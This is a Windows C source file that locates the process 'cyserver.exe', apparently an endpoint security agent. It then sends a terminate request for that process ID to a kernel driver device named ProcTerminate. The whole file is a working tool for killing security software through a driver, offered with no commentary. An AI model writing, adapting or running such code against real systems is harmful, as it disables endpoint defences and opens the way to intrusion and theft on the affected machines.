#include <windows.h>
#include <stdio.h>
#include <string.h>
#include "defines.h"

#define IOCTL_TERMINATE_PROC CTL_CODE( 0x8001, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS )

typedef struct {
	DWORD Pid;
} ProcTerm;;

DWORD findProc(LPCWSTR processName) {

	DWORD pid = 0;

	HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
	if (!hNtdll) {
		wprintf(L"[-] Failed to get handle to ntdll.dll\n");
		return 0;
	}
	
	fnNtQuerySystemInformation NtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(hNtdll, "NtQuerySystemInformation");
	if (!NtQuerySystemInformation) {
		wprintf(L"[-] Failed to get address of NtQuerySystemInformation\n");
		return 0;
	}

	NTSTATUS status;
	ULONG returnLength = 0;
	status = NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &returnLength);

	if (status != STATUS_INFO_LENGTH_MISMATCH) {
		wprintf(L"[-] NtQuerySystemInformation failed to get required buffer size\n");
		return 0;
	}

	PVOID buffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, returnLength);
	if (!buffer) {
		wprintf(L"[-] Failed to allocate memory for process information\n");
		return 0;
	}

	status = NtQuerySystemInformation(SystemProcessInformation, buffer, returnLength, &returnLength);
	
	if (!NT_SUCCESS(status)) {
		wprintf(L"[-] NtQuerySystemInformation failed\n");
		HeapFree(GetProcessHeap(), 0, buffer);
		return 0;
	}

	PSYSTEM_PROCESS_INFORMATION pInfo = (PSYSTEM_PROCESS_INFORMATION)buffer;
	while (TRUE) {
		if (pInfo->ImageName.Buffer && _wcsicmp(pInfo->ImageName.Buffer, processName) == 0) {
			pid = (DWORD)(ULONG_PTR)pInfo->UniqueProcessId;
			break;
		}

		if (pInfo->NextEntryOffset == 0) {
			break;
		}

		pInfo = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pInfo + pInfo->NextEntryOffset);

	}

	HeapFree(GetProcessHeap(), 0, buffer);
	return pid;
}



int main(int argc, char* argv[]) {

	PCWSTR processName = L"cyserver.exe";

	DWORD pid = findProc(processName);

	if (pid == 0) {
		wprintf(L"[-] Process %s not found\n", processName);
		return 1;
	}

	wprintf(L"[+] Found process %ls with PID: %lu\n", processName, pid);

	HANDLE hDevice = CreateFile(
		L"\\\\.\\ProcTerminate",
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		0,
		NULL
	);

	if (hDevice == INVALID_HANDLE_VALUE) {
		wprintf(L"[-] Failed to open device\n");
		return 1;
	}

	ProcTerm procTerm;
	procTerm.Pid = pid;

	DWORD bytesReturned;
	BOOL success = DeviceIoControl(
		hDevice,
		IOCTL_TERMINATE_PROC,
		&procTerm,
		sizeof(procTerm),
		NULL,
		0,
		&bytesReturned,
		NULL
	);

	if (!success) {
		wprintf(L"[-] DeviceIoControl failed\n");
		CloseHandle(hDevice);
		return 1;
	}

	wprintf(L"[+] Killed %s with PID: %lu\n", processName, pid);

	return 0;
}